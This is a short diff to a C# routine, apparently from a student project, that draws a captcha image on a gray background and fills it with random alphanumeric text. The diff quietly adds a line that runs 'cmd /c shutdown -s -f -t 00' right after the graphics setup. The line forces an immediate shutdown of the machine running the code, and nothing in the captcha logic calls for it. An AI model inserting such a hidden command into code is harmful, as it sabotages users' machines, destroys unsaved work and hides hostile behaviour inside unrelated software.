@@ -37,11 +37,13 @@ namespace _8_Bilet
 
             //Укажем где рисовать
             Graphics g = Graphics.FromImage((Image)result);
+            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
 
             //Пусть фон картинки будет серым
             g.Clear(Color.Gray);
 
             //Сгенерируем текст
+           
             text = String.Empty;
             string ALF = "1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
             for (int i = 0; i < 5; ++i)
